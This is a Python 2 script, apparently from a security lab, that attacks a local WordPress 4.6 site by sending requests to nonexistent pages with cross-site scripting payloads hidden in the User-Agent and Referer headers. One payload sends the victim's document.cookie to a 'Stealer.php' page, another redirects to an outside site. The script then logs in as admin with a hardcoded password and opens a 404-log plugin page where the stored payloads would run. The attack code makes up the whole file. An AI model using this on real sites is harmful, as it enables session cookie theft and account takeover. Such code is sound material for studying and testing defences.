#!/usr/bin/python
# coding: utf-8
#Bringing in mechanize and beautiful soup.  These are  installed separately from Python
import mechanize
from bs4 import BeautifulSoup
import urllib2


#Creating a mechanize browser
browser = mechanize.Browser()
browser.set_handle_robots(False)

#Opening my URI to the DVWA web page obviously your location will most likely vary
browser.open("http://localhost:8888/WordPress-4.6/wp-admin/")

#Printing to browser title to show where I am

print "\n" + ("# " + browser.title() + "\n")

header = {'User-Agent': '"<script>location.href = ‘http://localhost:8888/Stealer.php?cookie=’+document.cookie;</script>', 'Referer': '"<iframe src=/></iframe>'}
url = "http://localhost:8888/WordPress-4.6/wp-admin/nonexistantpage.html"

# wrap the request. You can replace None with the needed data if it's a POST request
request = urllib2.Request(url, None, header)

print header

print "\n"


# here you go
response = browser.open(request)

print response.geturl()

response.close()

print ("# " + browser.title() + "\n")


browser.open("http://localhost:8888/WordPress-4.6/wp-login.php?loggedout=true")
print ("# " + browser.title() + "\n")

##There is only one form on this page so I jump right in
browser.select_form("loginform")

##Below I am filling out the form fields and submitting for log in
browser.form['log'] = 'freh'
browser.form['pwd'] = 'fratello'
browser.submit()

print ("# " + browser.title() + "\n")

header = {'User-Agent': '"<iframe src=/></iframe>', 'Referer': '"<script>window.location.replace(http://www.ansa.it);</script>'}


url = "http://localhost:8888/WordPress-4.6/fakepage"

# wrap the request. You can replace None with the needed data if it's a POST request
request = urllib2.Request(url, None, header)

# here you go
response = browser.open(request)

print ("# " + browser.title() + "\n")

browser.open("http://localhost:8888/WordPress-4.6/wp-login.php?loggedout=true")


##There is only one form on this page so I jump right in
browser.select_form("loginform")

##Below I am filling out the form fields and submitting for log in
browser.form['log'] = 'admin'
browser.form['pwd'] = 'hgxSk#Fmexnu0^v!#B'
browser.submit()

#Again printing the browser title to show where I am
print ("# " + browser.title() + "\n")

browser.open("http://localhost:8888/WordPress-4.6/wp-admin/admin.php?page=i4t3-logs")

print ("# " + browser.title() + "\n")

